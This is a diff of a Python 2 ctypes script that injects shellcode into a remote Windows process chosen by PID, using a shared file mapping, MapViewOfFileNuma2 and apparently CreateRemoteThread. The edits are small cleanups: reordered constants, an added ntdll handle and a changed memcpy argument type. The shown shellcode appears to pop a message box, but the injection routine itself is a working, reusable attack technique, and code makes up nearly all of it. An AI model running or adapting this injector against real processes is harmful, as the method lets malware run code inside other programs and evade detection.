@@ -1,19 +1,20 @@
+# -*- coding: utf-8 -*-
 import sys
 from ctypes import *
 from ctypes.wintypes import *
 
 # Windows Constants
+PAGE_EXECUTE_READWRITE =    0x40
+PAGE_EXECUTE_READ =         0x20
 PROCESS_CREATE_THREAD =     0x0002
 PROCESS_QUERY_INFORMATION = 0x0400
 PROCESS_VM_OPERATION =      0x0008
 PROCESS_VM_WRITE =          0x0020
 PROCESS_VM_READ =           0x0010
-
+FILE_MAP_WRITE =            0x0002
 INVALID_HANDLE_VALUE =      HANDLE(-1)
 NUMA_NO_PREFERRED_NODE =    DWORD(-1)
-PAGE_EXECUTE_READWRITE =    0x40
-PAGE_EXECUTE_READ =         0x20
-FILE_MAP_WRITE =            0x0002
+
 
 # Windows types needed
 class SECURITY_ATTRIBUTES(Structure):
@@ -54,11 +55,12 @@ shellcode = \
     "\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00"
 
 if len(sys.argv) != 2:
-    print "[*] Usage: %s <PID>" %(sys.argv[0])
+    print "[*] Usage: %s <PID>" % sys.argv[0]
     sys.exit(0)
 
 kernel32 = windll.kernel32
 KernelBase = windll.KernelBase
+ntdll = windll.ntdll
 pid = sys.argv[1]
 
 # https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
@@ -106,7 +108,7 @@ if not lpMapAddress:
 # https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=vs-2019
 cdll.msvcrt.memcpy.restype = c_void_p       # void *memcpy(
 cdll.msvcrt.memcpy.argtypes = [c_void_p,    #    void *dest,
-                               c_wchar_p,   #    const void *src,
+                               c_char_p,   #    const void *src,
                                c_int]       #    size_t count );
 
 # Place the shellcode into the mapping object.
@@ -129,7 +131,6 @@ lpMapAddressRemote = KernelBase.MapViewOfFileNuma2(hFileMap, hProc, 0, None, 0, 
 if not lpMapAddressRemote:
     print "[-] MapViewOfFile2 failed with error: %s" % kernel32.GetLastError()
     sys.exit(0)
-
 print "[*] Injected global object mapping to the remote process with pid %s" % pid
 
 # https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
